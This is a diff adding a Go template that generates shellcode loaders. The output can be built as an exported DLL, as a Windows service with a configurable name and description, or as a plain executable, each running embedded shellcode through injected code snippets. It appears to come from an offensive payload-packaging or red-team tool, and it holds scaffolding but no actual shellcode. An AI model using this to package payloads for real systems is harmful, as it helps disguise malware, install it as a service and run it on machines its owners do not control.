@@ -1,0 +1,93 @@
+package main
+
+{{if .IsDLL}}
+import "C"
+{{else if .IsService}}
+import "github.com/kardianos/service"
+{{end}}
+
+import(
+{{range .Imports}} 
+    {{.}}
+{{end}}
+)
+
+{{if .Debug}}
+
+    var (
+        	debugWriter io.Writer
+        )
+
+func printDebug(t, format string, v ...interface{}) {
+		debugWriter = os.Stdout
+		var output string
+		switch t {
+		case "info":
+			output = "[INFO]    "
+		case "warning":
+			output = "[WARNING] "
+		case "error":
+			output = "[ERROR]   "
+		case "debug":
+			output = "[DEBUG]   "
+		}
+		output += format +"\n"
+		fmt.Fprintf(debugWriter, output, v...)
+	}
+{{end}}
+
+{{if .IsService}}
+type program struct {
+}
+
+func (p *program) Stop(s service.Service) error {
+	return nil
+}
+
+func (p *program) Start(s service.Service) error {
+
+	go start()
+
+    return nil
+}
+{{end}}
+
+{{range .FunctionsCode}} 
+{{.}}
+{{end}}
+
+{{if .IsDLL}}
+func main(){}
+
+{{.ExportNames}}
+
+//export Start
+func Start(){
+
+{{else if .IsService}}
+func main() {
+    svcConfig := &service.Config{
+        Name:        "{{.ServiceName}}",
+        DisplayName: "{{.ServiceDisplayName}}",
+        Description: "{{.ServiceDescription}}",
+    }
+    
+    prg := &program{}
+    s, err := service.New(prg, svcConfig)
+    if err != nil {
+        return
+    }
+
+    err = s.Run()
+}
+
+func start(){
+{{else}}
+func main(){
+{{end}}
+    shellcode := {{.ShellcodeData}}
+
+{{range .InstancesCode}} 
+    {{.}}
+{{end}}
+}
